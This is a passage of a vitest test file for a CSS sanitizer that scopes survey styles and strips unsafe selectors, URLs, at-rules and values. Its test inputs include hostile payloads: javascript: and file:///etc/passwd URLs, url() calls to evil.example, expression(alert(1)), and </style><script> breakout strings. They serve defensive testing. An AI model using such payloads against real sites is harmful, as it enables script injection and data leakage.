import type { Declaration } from "lightningcss";
import { readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { dirname, join } from "node:path";
import { describe, expect, test } from "vitest";
import {
  CUSTOM_CSS_MAX_SOURCE_BYTES,
  type TCustomCssScope,
  type TCustomCssWarning,
  ZCustomCssError,
  ZCustomCssWarning,
} from "@formbricks/types/custom-css";
import { CUSTOM_CSS_LIGHTNINGCSS_VERSION } from "./constants";
import { checkDeclaration } from "./declarations";
import {
  BLOCK_EXTERNAL_CUSTOM_CSS_RESOURCES,
  CUSTOM_CSS_MAX_RULES,
  CUSTOM_CSS_MAX_WARNINGS,
  CUSTOM_CSS_PROCESSOR_VERSION,
  type TCustomCssProcessOptions,
  getCustomCssProcessorVersion,
  normalizeCustomCssInput,
  processCustomCss,
} from "./index";

const run = (
  light: string | null,
  dark: string | null = null,
  scope: TCustomCssScope = "survey",
  options?: TCustomCssProcessOptions
) => processCustomCss({ scope, input: { light, dark } }, options);

const compile = (light: string | null, dark: string | null = null, scope: TCustomCssScope = "survey") => {
  const result = run(light, dark, scope);
  if (!result.ok) throw new Error(`expected success, got ${JSON.stringify(result.errors)}`);
  result.warnings.forEach((warning) => ZCustomCssWarning.parse(warning));
  return result;
};

const reject = (light: string | null, dark: string | null = null, scope: TCustomCssScope = "survey") => {
  const result = run(light, dark, scope);
  if (result.ok) throw new Error(`expected failure, got ${JSON.stringify(result.compiled)}`);
  result.errors.forEach((error) => ZCustomCssError.parse(error));
  expect(result).not.toHaveProperty("compiled");
  return result;
};

/** The rules inside the light survey layer. */
const lightRules = (light: string, scope: TCustomCssScope = "survey") => {
  const { compiled } = compile(light, null, scope);
  const prefix = `@layer fb-${scope}{`;
  expect(compiled.light?.startsWith(prefix)).toBe(true);
  return compiled.light!.slice(prefix.length, -1);
};
const darkRules = (dark: string) => {
  const { compiled } = compile(null, dark);
  return compiled.dark!.slice("@layer fb-survey-dark{".length, -1);
};
const codes = (warnings: TCustomCssWarning[]) => warnings.map((warning) => warning.code);

describe("API and URL policy", () => {
  test("blocks external resources by default", () => {
    expect(BLOCK_EXTERNAL_CUSTOM_CSS_RESOURCES).toBe(true);
    const result = compile(".a { background: url(https://cdn.example/a.png); color: red }");
    expect(codes(result.warnings)).toEqual(["external_resource_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{#fbjs .a{color:red!important}}");
    expect(result.processorVersion).toBe(CUSTOM_CSS_PROCESSOR_VERSION);
  });

  test("blocks relative, data and same-origin URLs too", () => {
    for (const url of ["a.png", "/a.png", "data:image/png;base64,AAAA", "//cdn.example/a.png"]) {
      expect(codes(compile(`.a { background-image: url("${url}") }`).warnings)).toEqual([
        "external_resource_removed",
      ]);
    }
  });

  test("turning the policy off only lets web and image URLs through", () => {
    const open = { blockExternalResources: false };
    const allowed = run(
      '.a { background: url(https://cdn.example/a.png) } .b { background: url("data:image/svg+xml,x") } .c { background-image: url(rel.png) }',
      null,
      "survey",
      open
    );
    expect(allowed.ok && allowed.warnings).toEqual([]);
    expect(allowed.ok && allowed.compiled.light).toContain(
      "background:url(https://cdn.example/a.png)!important"
    );

    for (const dangerous of [
      "javascript:alert(1)",
      " JaVa\tScRiPt:x",
      "vbscript:x",
      "data:text/html,x",
      "file:///etc/passwd",
    ]) {
      const result = run(`.a { background: url("${dangerous}") }`, null, "survey", open);
      expect(result.ok && codes(result.warnings)).toEqual(["unsafe_value_removed"]);
    }
    const viaString = run('.a { background-image: image("javascript:x") }', null, "survey", open);
    expect(viaString.ok && codes(viaString.warnings)).toEqual(["unsafe_value_removed"]);
  });

  test("turning the policy off cannot disable the rest of the processor", () => {
    const open = { blockExternalResources: false };
    const result = run(
      '@import url("https://fonts.example/a.css");\n@font-face { font-family: x; src: url(https://fonts.example/a.woff2) }\n' +
        ":root ~ div { color: red }\n.a { position: fixed; width: expression(1); content: attr(title) }\n@layer x { .b { color: red } }\n.c { color: red }",
      null,
      "survey",
      open
    );
    if (!result.ok) throw new Error("expected success");
    expect(codes(result.warnings)).toEqual([
      "import_removed",
      "font_face_removed",
      "unsafe_selector_removed",
      "fixed_position_removed",
      "unsafe_value_removed",
      "unsafe_value_removed",
      "unsupported_at_rule_removed",
    ]);
    expect(result.compiled.light).toBe("@layer fb-survey{#fbjs .c{color:red!important}}");
    expect(result.processorVersion).not.toBe(CUSTOM_CSS_PROCESSOR_VERSION);

    const tooLarge = run("a".repeat(CUSTOM_CSS_MAX_SOURCE_BYTES.survey + 1), null, "survey", open);
    expect(!tooLarge.ok && tooLarge.errors[0].code).toBe("source_too_large");
    const tooDeep = run(".a{".repeat(100), null, "survey", open);
    expect(!tooDeep.ok && tooDeep.errors[0].code).toBe("limit_exceeded");
  });

  test("an @import after other rules is removed with the same warning, not rejected as a syntax error", () => {
    // Concatenated stylesheets put an @import mid-file; browsers ignore it there and the rest applies.
    const result = compile(
      '.a { color: red }\n@import url("https://cdn.example/b.css");\n.b { color: red }',
      '.c { color: red }\r\n  @import "d.css" screen;\r\n.d { color: red }'
    );
    expect(result.warnings).toEqual([
      expect.objectContaining({ code: "import_removed", appearance: "light", line: 2, column: 1 }),
      expect.objectContaining({ code: "import_removed", appearance: "dark", line: 2, column: 3 }),
    ]);
    expect(result.compiled.light).toBe("@layer fb-survey{#fbjs .a,#fbjs .b{color:red!important}}");

    // Line and column numbers after the removed rule still point at the creator's source.
    expect(reject('.a {}\n@import "b.css";\n.b { color: red } }').errors).toEqual([
      expect.objectContaining({ code: "syntax_error", line: 3, column: 20 }),
    ]);
  });

  test("the processor version changes with the URL policy", () => {
    expect(getCustomCssProcessorVersion(true)).toBe(CUSTOM_CSS_PROCESSOR_VERSION);
    expect(getCustomCssProcessorVersion(false)).not.toBe(getCustomCssProcessorVersion(true));
    const open = run(".a { color: red }", null, "survey", { blockExternalResources: false });
    expect(open.ok && open.processorVersion).toBe(getCustomCssProcessorVersion(false));
  });

  test("the installed lightningcss is the one the processor version was produced with", () => {
    // Its printer shapes the output: bump the processor revision when upgrading it.
    const require = createRequire(import.meta.url);
    const manifestPath = join(dirname(require.resolve("lightningcss")), "..", "package.json");
    const manifest = JSON.parse(readFileSync(manifestPath, "utf8")) as {
      version: string;
    };
    expect(manifest.version).toBe(CUSTOM_CSS_LIGHTNINGCSS_VERSION);
  });

  test("the same source and scope always produce the same output", () => {
    const source =
      ":root { --ink: #123 } .a, .b { color: var(--ink); &:hover { color: red } } @import 'x.css';";
    expect(run(source, source, "workspace")).toEqual(run(source, source, "workspace"));
    expect(run(source, null, "workspace")).not.toEqual(run(source, null, "survey"));
  });

  test("returns one layer per field and null for empty fields", () => {
    expect(compile(".a { color: red }", "  \n ").compiled).toEqual({
      light: "@layer fb-survey{#fbjs .a{color:red!important}}",
      dark: null,
    });
    expect(compile(null, ".a { color: red }", "workspace").compiled).toEqual({
      light: null,
      dark: "@layer fb-workspace-dark{#fbjs[data-appearance=dark] .a{color:red!important}}",
    });
    // A field whose every rule was removed still compiles to its (empty) layer.
    expect(compile("@import 'x.css';").compiled.light).toBe("@layer fb-survey{}");
  });

  test("rejects malformed arguments as a processing failure instead of throwing", () => {
    const result = processCustomCss({ scope: "survey", input: { light: 1, dark: null } as never });
    expect(result.ok || result.errors[0].code).toBe("processing_failed");
  });
});

describe("selector scoping", () => {
  test("a leading byte order mark (a file saved with one) stays out of the first selector", () => {
    expect(lightRules("\uFEFF.a { color: red }")).toBe("#fbjs .a{color:red!important}");
    expect(lightRules("\uFEFF:root { --a: 1 }")).toBe("#fbjs{--a:1!important}");
  });

  test.each([
    [":root { --a: 1 }", "#fbjs{--a:1!important}"],
    ["html { color: red }", "#fbjs{color:red!important}"],
    ["BODY { color: red }", "#fbjs{color:red!important}"],
    ["#fbjs { color: red }", "#fbjs{color:red!important}"],
    [String.raw`#\66 bjs .x { color: red }`, "#fbjs .x{color:red!important}"],
    ["html.x .y { color: red }", "#fbjs.x .y{color:red!important}"],
    ["body > * { margin: 0 }", "#fbjs>*{margin:0!important}"],
    [":root::before { content: 'x' }", '#fbjs:before{content:"x"!important}'],
    [
      '.a, body, [data-fb-part="card"] { color: red }',
      "#fbjs .a,#fbjs,#fbjs [data-fb-part=card]{color:red!important}",
    ],
    [
      ".a + .b, .a ~ .b, #fbjs .c + .d { color: red }",
      "#fbjs .a+.b,#fbjs .a~.b,#fbjs .c+.d{color:red!important}",
    ],
    [":is(html, body) .x { color: red }", "#fbjs :is(#fbjs,#fbjs) .x{color:red!important}"],
    [
      '#fbjs[data-appearance="dark"] .a { color: red }',
      "#fbjs[data-appearance=dark] .a{color:red!important}",
    ],
  ])("light: %s", (source, expected) => {
    expect(lightRules(source)).toBe(expected);
  });

  test("supports the documented hooks, states and pseudo-classes", () => {
    const source = [
      '[data-fb-part="option"]:has(:checked) [data-fb-part="option-control"] { border-color: green }',
      '[data-fb-part="option"][aria-checked="true"] { border-color: green }',
      '[data-fb-part="input"][aria-invalid="true"] { border-color: red }',
      '[data-fb-part="button-primary"]:hover:not(:disabled), [data-fb-part="button-back"]:active { opacity: .8 }',
      '[data-fb-part="input"]:focus-visible { outline: 2px solid transparent }',
      ":where(.a, .b) :is(.c, .d) input:checked { color: red }",
    ].join("\n");
    const result = compile(source);
    expect(result.warnings).toEqual([]);
    // The minifier merges neighbouring rules with the same declarations into one list.
    expect(result.compiled.light).toContain(
      "#fbjs [data-fb-part=option]:has(:checked) [data-fb-part=option-control],#fbjs [data-fb-part=option][aria-checked=true]{border-color:green!important}"
    );
    expect(result.compiled.light).toContain(
      "#fbjs [data-fb-part=input][aria-invalid=true]{border-color:red!important}"
    );
    expect(result.compiled.light).toContain("#fbjs [data-fb-part=button-primary]:hover:not(:disabled)");
    expect(result.compiled.light).toContain("#fbjs [data-fb-part=input]:focus-visible");
    expect(result.compiled.light).toContain("#fbjs :where(.a,.b) :is(.c,.d) input:checked");
  });

  test.each([
    [":root { --ink: #fff }", "#fbjs[data-appearance=dark]{--ink:#fff!important}"],
    [
      "html, body, #fbjs { color: red }",
      "#fbjs[data-appearance=dark],#fbjs[data-appearance=dark],#fbjs[data-appearance=dark]{color:red!important}",
    ],
    [".a { color: red }", "#fbjs[data-appearance=dark] .a{color:red!important}"],
    [
      '#fbjs[data-appearance="dark"] .a { color: red }',
      "#fbjs[data-appearance=dark] .a{color:red!important}",
    ],
    ["html.x { color: red }", "#fbjs[data-appearance=dark].x{color:red!important}"],
  ])("dark: %s", (source, expected) => {
    expect(darkRules(source)).toBe(expected);
  });

  test.each([
    [":root ~ div { color: red }"],
    ["html + x { color: red }"],
    ["#fbjs ~ * { color: red }"],
    ["body + * { color: red }"],
    [":root:hover ~ .x { color: red }"],
    [".host-page :root .x { color: red }"],
    [".host-page #fbjs { color: red }"],
    ["div body { color: red }"],
    [":host { color: red }"],
    [":host(.x) .y { color: red }"],
    ["::backdrop { background: red }"],
    [".a::part(x) { color: red }"],
    ["::slotted(p) { color: red }"],
    ["::view-transition-old(root) { color: red }"],
    [":is(.a, :host) { color: red }"],
    ["*|div { color: red }"],
    ["& { color: red }"],
    ["& + div { color: red }"],
    [".a:not(&) { color: red }"],
  ])("removes a selector that could reach outside the survey: %s", (source) => {
    const result = compile(source);
    expect(codes(result.warnings)).toEqual(["unsafe_selector_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{}");
  });

  test("removes only the unsafe selectors of a list", () => {
    const result = compile(".a, :root ~ div, body > .b { color: red }");
    expect(codes(result.warnings)).toEqual(["unsafe_selector_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{#fbjs .a,#fbjs>.b{color:red!important}}");
  });

  test.each([
    [":root { & + div { color: red } }"],
    [":root { & ~ * { color: red } }"],
    ["body { .a & { color: red } }"],
    [".a { :not(&) { color: red } }"],
    [".a { :has(&) { color: red } }"],
    [".a { .b & { color: red } }"],
    [":root { .a, & + div { color: red } }"],
  ])("keeps nested selectors inside their parent: %s", (source) => {
    const result = compile(source);
    expect(codes(result.warnings)).toContain("unsafe_selector_removed");
    expect(result.compiled.light).not.toMatch(/\+div|~\*|:not\(\.a\)|:has\(\.a\)|\.b #fbjs/);
  });

  test("flattens nesting for the M2.01 targets", () => {
    expect(lightRules(".a { color: red; &:hover { color: blue } > .b { color: green } .c & {} }")).toBe(
      "#fbjs .a{color:red!important}#fbjs .a:hover{color:#00f!important}#fbjs .a>.b{color:green!important}"
    );
    expect(lightRules(":root { --a: 1; .b { --c: 2 } & > .d { --e: 3 } }")).toBe(
      "#fbjs{--a:1!important}#fbjs .b{--c:2!important}#fbjs>.d{--e:3!important}"
    );
    expect(lightRules(".a, .b { .c { color: red } }")).toBe(":is(#fbjs .a,#fbjs .b) .c{color:red!important}");
    expect(lightRules(".a { @media (width >= 600px) { color: red } }")).toBe(
      "@media (min-width:600px){#fbjs .a{color:red!important}}"
    );
    expect(lightRules(".a { :root & { color: red } }")).toBe("");
  });

  test.each([
    [".a:has(> .b) { color: red }", "#fbjs .a:has(>.b){color:red!important}"],
    [
      '[data-fb-part="option"]:has(+ .x) { color: red }',
      "#fbjs [data-fb-part=option]:has(+.x){color:red!important}",
    ],
    [".a:has(~ .b, .c) { color: red }", "#fbjs .a:has(~.b,.c){color:red!important}"],
    [":root:has(> .a) { color: red }", "#fbjs:has(>.a){color:red!important}"],
    [":root:has(.a ~ .b) { color: red }", "#fbjs:has(.a~.b){color:red!important}"],
    [".a { &:has(> .b) { color: red } }", "#fbjs .a:has(>.b){color:red!important}"],
    [".a { &:has(+ .b) { color: red } }", "#fbjs .a:has(+.b){color:red!important}"],
  ])("keeps a relative :has() and scopes it: %s", (source, expected) => {
    const result = compile(source);
    expect(result.warnings).toEqual([]);
    expect(result.compiled.light).toBe(`@layer fb-survey{${expected}}`);
  });

  test("relative :has() arguments do not count towards the universal-step limit", () => {
    expect(compile(".a:has(> .b) .c:has(> .d) .e:has(+ .f) { color: red }").warnings).toEqual([]);
  });

  test.each([
    ["#fbjs:has(~ .host) { color: red }"],
    [":root:has(+ x) { color: red }"],
    ["body:has(~ x) { color: red }"],
    ["html:has(> .a, + .b) { color: red }"],
    [":root:not(:has(~ .host)) { color: red }"],
    [":root:is(.x:has(+ .host)) { color: red }"],
    [":root { &:has(~ .host) { color: red } }"],
    [".a, :root { &:has(+ .host) { color: red } }"],
    [":scope .a { color: red }"],
    [".a:has(:scope) { color: red }"],
    [".a:has(:scope .b) { color: red }"],
    [".a:has(.b :scope) { color: red }"],
    [".a:has(:scope.x > .b) { color: red }"],
    [".a:has(:is(:scope) > .b) { color: red }"],
    [".a:has(> :scope) { color: red }"],
  ])("removes a :has() that reads the root's siblings, and written-out :scope: %s", (source) => {
    const result = compile(source);
    expect(codes(result.warnings)).toEqual(["unsafe_selector_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{}");
  });

  test("a sibling :has() stays valid once the subject is below the root", () => {
    expect(lightRules(":root > .a:has(~ .b) { color: red }")).toBe("#fbjs>.a:has(~.b){color:red!important}");
    expect(darkRules(".a:has(+ .b) { color: red }")).toBe(
      "#fbjs[data-appearance=dark] .a:has(+.b){color:red!important}"
    );
    expect(codes(compile(null, ":root:has(~ .host) { color: red }").warnings)).toEqual([
      "unsafe_selector_removed",
    ]);
  });

  test("sibling steps below the root stay inside it", () => {
    expect(lightRules(".a { & + .b { color: red } }")).toBe("#fbjs .a+.b{color:red!important}");
    expect(lightRules(":root { > .a { & ~ .b { color: red } } }")).toBe("#fbjs>.a~.b{color:red!important}");
  });
});

describe("at-rules", () => {
  test("keeps @media, @supports and @container with their rules scoped and important", () => {
    expect(
      lightRules(
        "@media (max-width: 600px) { .a { color: red } }\n@supports (display: grid) { :root { --g: 1 } }\n@container card (min-width: 20rem) { .b { color: red } }"
      )
    ).toBe(
      "@media (max-width:600px){#fbjs .a{color:red!important}}@supports (display:grid){#fbjs{--g:1!important}}@container card (min-width:20rem){#fbjs .b{color:red!important}}"
    );
  });

  test("namespaces keyframes and their references per scope and appearance", () => {
    const result = compile(
      '@keyframes pulse { from { opacity: 1 !important } to { opacity: 0 } }\n@keyframes "two words" { to { color: red } }\n.a { animation: pulse 1s infinite }\n.a2 { animation-name: pulse, "two words", spin }\n.b { animation: var(--d) pulse }',
      "@keyframes glow { to { opacity: .5 } }\n.c { animation-name: glow, pulse }",
      "workspace"
    );
    const light = result.compiled.light!;
    expect(light).toContain("@keyframes fb-workspace--pulse{0%{opacity:1}to{opacity:0}}");
    expect(light).toContain("@keyframes fb-workspace--two\\ words{");
    expect(light).toContain("animation:1s infinite fb-workspace--pulse!important");
    // Names the CSS does not define (built-in or host keyframes) are referenced, never redefined.
    expect(light).toContain("animation-name:fb-workspace--pulse,fb-workspace--two\\ words,spin!important");
    expect(light).toContain("animation:var(--d) fb-workspace--pulse!important");
    expect(light).not.toMatch(/@keyframes (pulse|spin)/);
    // Dark CSS can use its own keyframes and those of the light CSS it builds on.
    expect(result.compiled.dark).toContain("@keyframes fb-workspace-dark--glow{");
    expect(result.compiled.dark).toContain(
      "animation-name:fb-workspace-dark--glow,fb-workspace--pulse!important"
    );
  });

  test.each([
    ['@import url("https://fonts.googleapis.com/css2?family=Inter");', "import_removed"],
    ["@import 'a.css' layer(x) supports(display: grid) screen;", "import_removed"],
    ["@font-face { font-family: x; src: url(a.woff2) }", "font_face_removed"],
    ["@layer a, b;", "unsupported_at_rule_removed"],
    ["@layer a { .x { color: red } }", "unsupported_at_rule_removed"],
    ["@scope (.a) to (.b) { .x { color: red } }", "unsupported_at_rule_removed"],
    [
      '@property --x { syntax: "<length>"; inherits: false; initial-value: 0px }',
      "unsupported_at_rule_removed",
    ],
    ["@namespace svg url(http://www.w3.org/2000/svg);", "unsupported_at_rule_removed"],
    ["@page { margin: 1cm }", "unsupported_at_rule_removed"],
    ["@counter-style x { system: cyclic; symbols: a }", "unsupported_at_rule_removed"],
    ["@font-feature-values Font { @styleset { nice: 1 } }", "unsupported_at_rule_removed"],
    ["@starting-style { .x { opacity: 0 } }", "unsupported_at_rule_removed"],
    ["@view-transition { navigation: auto }", "unsupported_at_rule_removed"],
    ["@-moz-document url-prefix() { .x { color: red } }", "unsupported_at_rule_removed"],
    ["@custom-media --small (max-width: 30em);", "unsupported_at_rule_removed"],
    ["@secret-token-123 x { .x { color: red } }", "unsupported_at_rule_removed"],
    [".a { @layer x { color: red } }", "unsupported_at_rule_removed"],
  ])("removes %s", (source, code) => {
    const result = compile(source);
    expect(codes(result.warnings)).toEqual([code]);
    expect(result.warnings[0]).toMatchObject({ line: 1, column: expect.any(Number) });
    expect(result.warnings[0].reason).not.toContain("secret");
    expect(result.compiled.light).not.toMatch(/@(import|font-face|layer x|scope|property|namespace|page)/);
  });

  test("drops @charset silently", () => {
    expect(compile('@charset "utf-8"; .a { color: red }').warnings).toEqual([]);
  });

  test.each([
    ["@supports (background: url(https://cdn.example/a.png)) { .a { color: red } }"],
    [String.raw`@supports (background: u\72 l(https://cdn.example/a.png)) { .a { color: red } }`],
    [String.raw`@supports (background: \75 \72 \6c (a.png)) { .a { color: red } }`],
    ["@supports (display: grid) and (background: IMAGE-SET('a.png' 1x)) { .a { color: red } }"],
    ["@supports not (background: -webkit-cross-fade(url(a.png), url(b.png), 50%)) { .a { color: red } }"],
    ["@supports (content: src('a.png')) or (display: flex) { .a { color: red } }"],
    [".a { @supports (background: image('a.png')) { color: red } }"],
  ])("removes @supports whose condition names a resource function: %s", (source) => {
    const result = compile(source);
    expect(codes(result.warnings)).toEqual(["unsupported_at_rule_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{}");
  });

  test("keeps @supports conditions without resource functions", () => {
    expect(lightRules("@supports selector(:has(a)) and (not (display: grid)) { .a { color: red } }")).toBe(
      "@supports selector(:has(a)) and (not (display:grid)){#fbjs .a{color:red!important}}"
    );
  });

  test("removes a group rule whose condition loads a resource", () => {
    const result = compile("@container style(--bg: url(x.png)) { .a { color: red } }");
    expect(codes(result.warnings)).toEqual(["external_resource_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{}");
  });
});

describe("declaration values", () => {
  test.each([
    [".a { background: url(https://evil.example/q1=yes) }", "external_resource_removed"],
    [String.raw`.a { background: u\72 l(https://evil.example/x) }`, "external_resource_removed"],
    [String.raw`.a { background: \75 \72 \6c (https://evil.example/x) }`, "external_resource_removed"],
    [".a { background: URL(https://evil.example/x) }", "external_resource_removed"],
    [".a { --img: url(https://evil.example/x) }", "external_resource_removed"],
    [String.raw`.a { --img: u\72 l(https://evil.example/x) }`, "external_resource_removed"],
    [".a { background: var(--missing, url(https://evil.example/x)) }", "external_resource_removed"],
    [".a { --x: 1px var(--y, image-set('a.png' 1x)) }", "external_resource_removed"],
    [".a { background-image: image-set('a.png' 1x, url(b.png) 2x) }", "external_resource_removed"],
    [".a { background-image: -webkit-image-set('a.png' 1x) }", "external_resource_removed"],
    [".a { background-image: image('a.png') }", "external_resource_removed"],
    [".a { background-image: cross-fade(url(a.png), url(b.png), 50%) }", "external_resource_removed"],
    [".a { background-image: src('a.png') }", "external_resource_removed"],
    [".a { cursor: url(a.cur), auto }", "external_resource_removed"],
    [".a { filter: url(#f) }", "external_resource_removed"],
    [".a { mask-image: url(m.svg) }", "external_resource_removed"],
    [".a { list-style: url(dot.png) }", "external_resource_removed"],
    [".a { content: url(x.png) }", "external_resource_removed"],
    [".a { background-image: element(#host-logo) }", "unsafe_value_removed"],
    [".a { background-image: -moz-element(#host-logo) }", "unsafe_value_removed"],
    [".a { content: attr(data-secret) }", "unsafe_value_removed"],
    [".a { --x: attr(value) }", "unsafe_value_removed"],
    [".a { width: expression(alert(1)) }", "unsafe_value_removed"],
    [".a { --x: <!-- }", "unsafe_value_removed"],
    [".a { behavior: url(x.htc) }", "unsafe_property_removed"],
    [String.raw`.a { beh\61 vior: x }`, "unsafe_property_removed"],
    [".a { -moz-binding: url(x.xml#y) }", "unsafe_property_removed"],
    [".a { view-transition-name: header }", "unsafe_property_removed"],
    [".a { position: fixed; inset: 0; z-index: 2147483647 }", "fixed_position_removed"],
    [".a { POSITION: FIXED }", "fixed_position_removed"],
    [".a { position: fixed !important }", "fixed_position_removed"],
    [".a { position: var(--p) }", "unsafe_value_removed"],
    [".a { position: var(--p, fixed) }", "unsafe_value_removed"],
    [".a { position: env(--p) }", "unsafe_value_removed"],
    [".a { position: inherit }", "unsafe_value_removed"],
    [".a { position: absolute fixed }", "unsafe_value_removed"],
  ])("%s → %s", (source, code) => {
    const result = compile(source);
    expect(codes(result.warnings)).toEqual([code]);
    expect(result.compiled.light).not.toMatch(
      /url\(|image-set|image\(|cross-fade|src\(|element\(|attr\(|expression|behavior|binding|fixed|view-transition|<!--/i
    );
  });

  test.each([
    ["anchor-name: --menu"],
    ["anchor-scope: all"],
    ["position-anchor: --host-logo"],
    ["position-area: top"],
    ["inset-area: top"],
    ["position-try: --flip"],
    ["position-try-fallbacks: flip-block"],
    ["position-try-options: flip-block"],
    ["scroll-timeline-name: --page"],
    ["scroll-timeline: --page y"],
    ["view-timeline-name: --card"],
    ["view-timeline: --card block"],
    ["timeline-scope: --page"],
    [String.raw`anch\6f r-name: --menu`],
  ])("removes properties that register or use page-wide names: %s", (declaration) => {
    const result = compile(`.a { ${declaration} }`);
    expect(codes(result.warnings)).toEqual(["unsafe_property_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{}");
  });

  test.each([
    ["pointer-events: auto"],
    ["pointer-events: auto !important"],
    ["POINTER-EVENTS: all"],
    [String.raw`pointer-ev\65 nts: auto`],
  ])("removes pointer-events, which would let a corner survey take the page's clicks: %s", (declaration) => {
    const result = compile(`#fbjs * { ${declaration} }`);
    expect(codes(result.warnings)).toEqual(["unsafe_property_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{}");
  });

  test.each([
    ["top: anchor(--host-logo bottom)"],
    ["width: anchor-size(--host-logo width)"],
    ["--gap: calc(anchor(--x top) + 1px)"],
    ["margin-top: max(1px, ANCHOR(--x top))"],
  ])("removes anchor functions: %s", (declaration) => {
    const result = compile(`.a { ${declaration} }`);
    expect(codes(result.warnings)).toEqual(["unsafe_value_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{}");
  });

  test("keeps ordinary values, gradients, math, variables and text content", () => {
    const source = [
      ".a { content: 'Required *'; quotes: none }",
      ".b { background: linear-gradient(90deg, #fff 0%, rgb(0 0 0 / .5) 100%), radial-gradient(circle, red, blue) }",
      ".c { width: calc(100% - 2 * var(--gap, 4px)); height: min(10px, 2vh); margin: max(1px, 2px) clamp(1rem, 2vw, 3rem) }",
      ":root { --ring: 0 0 0 3px var(--a), 0 0 4px 6px var(--b); --font: 'Inter', Arial, sans-serif }",
      ".d { position: sticky; top: 0 } .e { position: absolute } .f { position: relative } .g { position: revert-layer }",
      ".h { box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1), 0 0 0 3px var(--ring); transition: background-color .15s ease }",
      ".i { display: none; visibility: hidden; height: 0; color: light-dark(#000, #fff) }",
    ].join("\n");
    const result = compile(source);
    expect(result.warnings).toEqual([]);
    const light = result.compiled.light!;
    expect(light).toContain('content:"Required *"!important');
    expect(light).toContain("linear-gradient(90deg,#fff 0%,#00000080 100%)");
    expect(light).toMatch(/width:calc\(100(\.0)?% - 2 \* var\(--gap,4px\)\)!important/);
    expect(light).toContain("height:min(10px,2vh)!important");
    expect(light).toContain("--ring:0 0 0 3px var(--a), 0 0 4px 6px var(--b)!important");
    expect(light).toContain('--font:"Inter", Arial, sans-serif!important');
    expect(light).toContain("position:sticky!important");
    expect(light).toContain("position:revert-layer!important");
    expect(light).toContain("light-dark(#000,#fff)");
  });

  test.each([
    ["#fbjs { all: inherit }"],
    [".a { ALL: INHERIT }"],
    [String.raw`.a { \61ll: inherit }`],
    [String.raw`.a { all: inh\65 rit }`],
    [".a { all: inherit !important }"],
  ])("removes `all` values that could inherit position from the page: %s", (source) => {
    const result = compile(source);
    expect(codes(result.warnings)).toEqual(["unsafe_value_removed"]);
    expect(result.compiled.light).toBe("@layer fb-survey{}");
  });

  test.each([[".a { all: var(--x) }"], [".a { all: env(x) }"]])(
    "`all` taken from a function is a syntax error, so nothing is compiled: %s",
    (source) => {
      expect(reject(source).errors[0].code).toBe("syntax_error");
    }
  );

  test("keeps `all` keywords that reset instead of inheriting", () => {
    const result = compile(
      ".a { all: revert } .b { ALL: Initial } .c { all: unset } .d { all: revert-layer }"
    );
    expect(result.warnings).toEqual([]);
    expect(result.compiled.light).toBe(
      "@layer fb-survey{#fbjs .a{all:revert!important}#fbjs .b{all:initial!important}#fbjs .c{all:unset!important}#fbjs .d{all:revert-layer!important}}"
    );
  });

  test.each([
    [[{ type: "token", value: { type: "ident", value: "inherit" } }], false],
    [[{ type: "var", value: { name: { ident: "--x" } } }], false],
    [[{ type: "env", value: { name: { type: "ua", value: "safe-area-inset-top" } } }], false],
    [[{ type: "token", value: { type: "ident", value: "REVERT" } }], true],
  ])("holds an unparsed `all` to one allowed keyword: %j → %s", (value, ok) => {
    const declaration = { property: "unparsed", value: { propertyId: { property: "all" }, value } };
    expect(checkDeclaration(declaration as Declaration, { blockExternalResources: true }).ok).toBe(ok);
  });

  test("a custom property may hold `fixed`, but position never reads a custom property", () => {
    const result = compile(
      ":root { --p: fixed } .a { position: var(--p) } .b { --p: fixed; position: absolute }"
    );
    expect(codes(result.warnings)).toEqual(["unsafe_value_removed"]);
    expect(result.compiled.light).toBe(
      "@layer fb-survey{#fbjs{--p:fixed!important}#fbjs .b{--p:fixed!important;position:absolute!important}}"
    );
  });

  test("makes every accepted declaration important, keeping explicit importance on top", () => {
    // Both become important; the one the creator marked important comes last, so it still wins.
    expect(lightRules(".a { color: red !important; color: blue }")).toBe("#fbjs .a{color:red!important}");
  });
});

describe("HTML style breakout", () => {
  test.each([
    [".a { content: '</style><script>alert(1)</script>' }"],
    ['.a { --x: "</STYLE >" }'],
    ['[title="</style>"] { color: red }'],
    [String.raw`.a\<\/style { color: red }`],
    [".a { --x: </style> }"],
    [".a { font-family: '</style>' }"],
    ["/*! </style> */ .a { color: red }"],
    [".a { grid-template-areas: '</style>' }"],
  ])("never emits a closing tag: %s", (source) => {
    const result = compile(source);
    const output = `${result.compiled.light}`;
    expect(output).not.toMatch(/<\/|<!--/);
    expect(output.toLowerCase()).not.toContain("</style");
  });

  test("escapes < so string values keep their meaning", () => {
    expect(lightRules(".a { content: 'a < b' }")).toBe(String.raw`#fbjs .a{content:"a \3c  b"!important}`);
  });
});

describe("limits and failures", () => {
  test("rejects syntax errors with a location and a reason that does not echo the source", () => {
    const result = reject(".a { color: red }\n.b { background: url(SECRET'VALUE) }");
    expect(result.errors).toEqual([
      expect.objectContaining({ code: "syntax_error", appearance: "light", line: 2, column: 18 }),
    ]);
    expect(result.errors[0].reason).not.toMatch(/SECRET|VALUE/);
    expect(reject(".a { color: red } }").errors[0].code).toBe("syntax_error");
  });

  test("reports errors from both fields and never returns partial output", () => {
    const result = reject(".a { color: red } }", ".b { color: red } }");
    expect(result.errors.map((error) => error.appearance)).toEqual(["light", "dark"]);
  });

  test("checks the combined UTF-8 size before parsing", () => {
    const half = "€".repeat(Math.ceil(CUSTOM_CSS_MAX_SOURCE_BYTES.survey / 6) + 1);
    const result = reject(`/*${half}*/`, `/*${half}*/`);
    expect(result.errors).toEqual([
      expect.objectContaining({ code: "source_too_large", appearance: null, line: null, column: null }),
    ]);
    expect(compile(`/*${half}*/`, `/*${half}*/`, "workspace").ok).toBe(true);
  });

  test("rejects output that grows past the budget", () => {
    // Each declaration gains `!important` and each selector `#fbjs `: the source fits, the output does not.
    let source = "";
    for (let i = 0; source.length < CUSTOM_CSS_MAX_SOURCE_BYTES.survey - 30; i++)
      source += `.a${i}{--x:${i};--y:2}\n`;
    expect(reject(source).errors).toEqual([
